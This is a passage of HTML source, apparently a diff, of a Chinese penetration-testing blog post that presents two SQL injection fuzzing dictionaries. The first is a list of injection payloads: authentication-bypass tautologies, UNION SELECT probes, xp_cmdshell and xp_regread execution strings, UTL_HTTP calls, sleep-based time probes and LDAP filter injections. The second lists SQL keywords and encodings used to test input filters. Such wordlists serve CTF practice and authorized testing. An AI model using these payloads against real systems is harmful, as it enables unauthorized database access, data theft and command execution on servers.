class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-comment">--</span><br><span class="hljs-string">&#x27; or &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;--</span><br><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span> <span class="hljs-comment">--&#x27;</span><br><span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-comment">--</span><br><span class="hljs-keyword">or</span><span class="hljs-operator">%</span><span class="hljs-number">201</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><br><span class="hljs-keyword">or</span><span class="hljs-operator">%</span><span class="hljs-number">201</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-comment">--</span><br><span class="hljs-string">&#x27; or 1=1 or &#x27;&#x27;=&#x27;</span><br> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">or</span> &quot;&quot;<span class="hljs-operator">=</span><br><span class="hljs-string">&#x27; or a=a--</span><br><span class="hljs-string"> or a=a</span><br><span class="hljs-string">&#x27;</span>) <span class="hljs-keyword">or</span> (<span class="hljs-string">&#x27;a&#x27;</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;a</span><br><span class="hljs-string">) or (a=a</span><br><span class="hljs-string">hi or a=a</span><br><span class="hljs-string">hi or 1=1 --&quot;</span><br><span class="hljs-string">hi&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-comment">--</span><br>hi<span class="hljs-string">&#x27; or &#x27;</span>a<span class="hljs-string">&#x27;=&#x27;</span>a<br>hi<span class="hljs-string">&#x27;) or (&#x27;</span>a<span class="hljs-string">&#x27;=&#x27;</span>a<br>&quot;hi&quot;&quot;) or (&quot;&quot;a&quot;&quot;=&quot;&quot;a&quot;<br><span class="hljs-string">&#x27;hi&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;x&#x27;</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;x&#x27;</span>;<br><span class="hljs-variable">@variable</span><br>,<span class="hljs-variable">@variable</span><br>PRINT<br>PRINT @<span class="hljs-variable">@variable</span><br><span class="hljs-keyword">select</span><br><span class="hljs-keyword">insert</span><br><span class="hljs-keyword">as</span><br><span class="hljs-keyword">or</span><br><span class="hljs-keyword">procedure</span><br>limit<br><span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span><br><span class="hljs-keyword">asc</span><br><span class="hljs-keyword">desc</span><br><span class="hljs-keyword">delete</span><br><span class="hljs-keyword">update</span><br><span class="hljs-keyword">distinct</span><br><span class="hljs-keyword">having</span><br><span class="hljs-keyword">truncate</span><br>replace<br><span class="hljs-keyword">like</span><br>handler<br>bfilename<br><span class="hljs-string">&#x27; or username like &#x27;</span><span class="hljs-operator">%</span><br><span class="hljs-string">&#x27; or uname like &#x27;</span><span class="hljs-operator">%</span><br><span class="hljs-string">&#x27; or userid like &#x27;</span><span class="hljs-operator">%</span><br><span class="hljs-string">&#x27; or uid like &#x27;</span><span class="hljs-operator">%</span><br><span class="hljs-string">&#x27; or user like &#x27;</span><span class="hljs-operator">%</span><br><span class="hljs-keyword">exec</span> xp<br><span class="hljs-keyword">exec</span> sp<br><span class="hljs-string">&#x27;; exec master..xp_cmdshell</span><br><span class="hljs-string">&#x27;</span>; <span class="hljs-keyword">exec</span> xp_regread<br>t<span class="hljs-string">&#x27;exec master..xp_cmdshell &#x27;</span>nslookup www.google.com<span class="hljs-string">&#x27;--</span><br><span class="hljs-string">--sp_password</span><br><span class="hljs-string">\x27UNION SELECT</span><br><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span><br><span class="hljs-string">&#x27; UNION ALL SELECT</span><br><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">or</span> (<span class="hljs-keyword">EXISTS</span>)<br><span class="hljs-string">&#x27; (select top 1</span><br><span class="hljs-string">&#x27;</span><span class="hljs-operator">||</span>UTL_HTTP.REQUEST<br><span class="hljs-number">1</span>;<span class="hljs-keyword">SELECT</span><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-operator">*</span><br>to_timestamp_tz<br>tz_offset<br><span class="hljs-operator">&lt;&gt;</span>&quot;&#x27;%;)(&amp;+<br>&#x27;%20or%201=1<br>%27%20or%201=1<br>%20$(sleep%2050)<br>%20&#x27;sleep%2050&#x27;<br>char%4039%41%2b%40SELECT<br>&amp;apos;%20OR<br>&#x27;sqlattempt1<br>(sqlattempt2)<br>|<br>%7C<br>*|<br>%2A%7C<br>*(|(mail=*))<br>%2A%28%7C%28mail%3D%2A%29%29<br>*(|(objectclass=*))<br>%2A%28%7C%28objectclass%3D%2A%29%29<br>(<br>%28<br>)<br>%29<br>&amp;<br>%26<br>!<br>%21<br>&#x27; or 1=1 or &#x27;&#x27;=&#x27;<br>&#x27; or &#x27;&#x27;=&#x27;<br>x&#x27; or 1=1 or &#x27;x&#x27;=&#x27;y<br>/<br>//<br>//*<br>*/*<br>a&#x27; or 3=3--<br>&quot;a&quot;&quot; <span class="hljs-keyword">or</span> <span class="hljs-number">3</span><span class="hljs-operator">=</span><span class="hljs-number">3</span><span class="hljs-comment">--&quot;</span><br><span class="hljs-string">&#x27; or 3=3</span><br><span class="hljs-string">‘ or 3=3 --</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="字典2-1"><a href="#字典2-1" class="headerlink" title="字典2"></a>字典2</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">length <br>Length<br>+<br><span class="hljs-keyword">handler</span><br><span class="hljs-keyword">like</span><br><span class="hljs-keyword">LiKe</span><br><span class="hljs-keyword">select</span><br><span class="hljs-keyword">SeleCT</span> <br>sleep<br>SLEEp<br><span class="hljs-keyword">database</span><br><span class="hljs-keyword">DATABASe</span><br><span class="hljs-keyword">delete</span><br><span class="hljs-keyword">having</span><br><span class="hljs-keyword">or</span><br><span class="hljs-keyword">oR</span><br><span class="hljs-keyword">as</span><br><span class="hljs-keyword">As</span><br>-~<br>BENCHMARK<br><span class="hljs-keyword">limit</span><br><span class="hljs-keyword">LimIt</span><br>left<br>Left<br><span class="hljs-keyword">select</span><br><span class="hljs-keyword">SELECT</span><br><span class="hljs-keyword">insert</span><br><span class="hljs-keyword">insERT</span><br><span class="hljs-keyword">INSERT</span><br>right<br>#<br><span class="hljs-comment">--+</span><br>INFORMATION<br><span class="hljs-comment">--</span><br>;<br>!<br>%<br>+<br>xor<br>&lt;&gt;<br>(<br>&gt;<br>&lt;<br>)<br>.<br>^<br>=<br><span class="hljs-keyword">AND</span><br><span class="hljs-keyword">ANd</span><br><span class="hljs-keyword">BY</span><br><span class="hljs-keyword">By</span><br><span class="hljs-keyword">CAST</span><br><span class="hljs-keyword">COLUMN</span><br><span class="hljs-keyword">COlumn</span><br>COUNT<br>Count<br><span class="hljs-keyword">CREATE</span><br><span class="hljs-keyword">END</span><br><span class="hljs-keyword">case</span><br><span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span><br><span class="hljs-string">when</span><br><span class="hljs-string">admin&#x27;</span><br>&quot;<br>length <br>+<br>REVERSE<br><br>ascii<br>ASSIC<br>ASSic<br>select <br>database<br>left<br>right<br>union<br>UNIon<br>UNION<br>&quot;<br>&amp;<br>&amp;&amp;<br>||<br>oorr<br>/<br>//<br>/<span class="hljs-comment">/*</span><br><span class="hljs-comment">*/</span>*<br><span class="hljs-comment">/**/</span><br>anandd<br><span class="hljs-keyword">GROUP</span><br><span class="hljs-keyword">HAVING</span><br><span class="hljs-keyword">IF</span><br><span class="hljs-keyword">INTO</span><br><span class="hljs-keyword">JOIN</span><br>LEAVE<br>LEFT<br><span class="hljs-keyword">LEVEL</span><br>sleep<br><span class="hljs-keyword">LIKE</span><br>NAMES<br>NEXT<br><span class="hljs-keyword">NULL</span><br><span class="hljs-keyword">OF</span><br><span class="hljs-keyword">ON</span><br>|<br>infromation_schema<br><span class="hljs-keyword">user</span><br><span class="hljs-keyword">OR</span><br><span class="hljs-keyword">ORDER</span><br>ORD<br><span class="hljs-keyword">SCHEMA</span><br><span class="hljs-keyword">SELECT</span><br><span class="hljs-keyword">SET</span><br><span class="hljs-keyword">TABLE</span><br><span class="hljs-keyword">THEN</span><br><span class="hljs-keyword">UNION</span><br><span class="hljs-keyword">UPDATE</span><br><span class="hljs-keyword">USER</span><br><span class="hljs-keyword">USING</span><br><span class="hljs-keyword">VALUE</span><br><span class="hljs-keyword">VALUES</span><br><span class="hljs-keyword">WHEN</span><br><span class="hljs-keyword">WHERE</span><br><span class="hljs-keyword">ADD</span><br><span class="hljs-keyword">AND</span><br><span class="hljs-keyword">prepare</span><br><span class="hljs-keyword">set</span><br><span class="hljs-keyword">update</span><br><span class="hljs-keyword">delete</span><br><span class="hljs-keyword">drop</span><br>inset<br><span class="hljs-keyword">CAST</span><br><span class="hljs-keyword">COLUMN</span><br>CONCAT<br>GROUP_CONCAT<br>group_concat<br><span class="hljs-keyword">CREATE</span><br><span class="hljs-keyword">DATABASE</span><br>DATABASES<br><span class="hljs-keyword">alter</span><br><span class="hljs-keyword">DELETE</span><br><span class="hljs-keyword">DROP</span><br>floor<br>rand()<br>information_schema.<span class="hljs-keyword">tables</span><br>TABLE_SCHEMA<br>%df<br>concat_ws()<br>concat<br><span class="hljs-keyword">LIMIT</span><br>ORD<br><span class="hljs-keyword">ON</span><br>extractvalue<br><span class="hljs-keyword">order</span> <br>CAST()<br><span class="hljs-keyword">by</span><br><span class="hljs-keyword">ORDER</span><br>OUTFILE<br><span class="hljs-keyword">RENAME</span><br>REPLACE<br><span class="hljs-keyword">SCHEMA</span><br><span class="hljs-keyword">SELECT</span><br><span class="hljs-keyword">SET</span><br>updatexml<br><span class="hljs-keyword">SHOW</span><br><span class="hljs-keyword">SQL</span><br><span class="hljs-keyword">TABLE</span><br><span class="hljs-keyword">THEN</span><br><span class="hljs-keyword">TRUE</span><br>instr<br>benchmark<br><span class="hljs-keyword">format</span><br>bin<br>substring<br>ord<br><br><span class="hljs-keyword">UPDATE</span><br><span class="hljs-keyword">VALUES</span><br><span class="hljs-type">VARCHAR</span><br><span class="hljs-keyword">VERSION</span><br><span class="hljs-keyword">WHEN</span><br><span class="hljs-keyword">WHERE</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">`</span><br><span class="hljs-comment">  </span><br><span class="hljs-comment">,</span><br><span class="hljs-comment">users</span><br><span class="hljs-comment">%0a</span><br><span class="hljs-comment">%0A</span><br><span class="hljs-comment">%0b</span><br><span class="hljs-comment">mid</span><br><span class="hljs-comment">for</span><br><span class="hljs-comment">BEFORE</span><br><span class="hljs-comment">REGEXP</span><br><span class="hljs-comment">RLIKE</span><br><span class="hljs-comment">in</span><br><span class="hljs-comment">sys schemma</span><br><span class="hljs-comment">SEPARATOR</span><br><span class="hljs-comment">XOR</span><br><span class="hljs-comment">CURSOR</span><br><span class="hljs-comment">FLOOR</span><br><span class="hljs-comment">sys.schema_table_statistics_with_buffer</span><br><span class="hljs-comment">INFILE</span><br><span class="hljs-comment">count</span><br><span class="hljs-comment">%0c</span><br><span class="hljs-comment">from</span><br><span class="hljs-comment">%0d</span><br><span class="hljs-comment">%a0</span><br><span class="hljs-comment">=</span><br><span class="hljs-comment">@</span><br><span class="hljs-comment">else</span><br><span class="hljs-comment">%27</span><br><span class="hljs-comment">%23</span><br><span class="hljs-comment">%22</span><br><span class="hljs-comment">%20</span><br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="category-chain-item">渗透测试</a>
+  
+  
+
+      </span>
+    
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/sql%E6%B3%A8%E5%85%A5/" class="category-chain-item">sql注入</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">#渗透测试</a>
+      
+        <a href="/tags/sql%E6%B3%A8%E5%85%A5/">#sql注入</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>[渗透测试] SQL注入fuzz字典</div>
+      <div>https://s1n9l3.github.io/2022/12/13/[渗透测试] sql注入fuzz字典/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>YY</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年12月13日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/12/13/%5Bctf-web%5D%20CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-HackWorld/" title="[ctf-web] CISCN2019-华北赛区-Day2-Web1-HackWorld">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">[ctf-web] CISCN2019-华北赛区-Day2-Web1-HackWorld</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/12/11/%5Bctf-web%5D%20GXYCTF2019-BabySQLi/" title="[ctf-web] GXYCTF2019-BabySQLi">
+                        <span class="hidden-mobile">[ctf-web] GXYCTF2019-BabySQLi</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
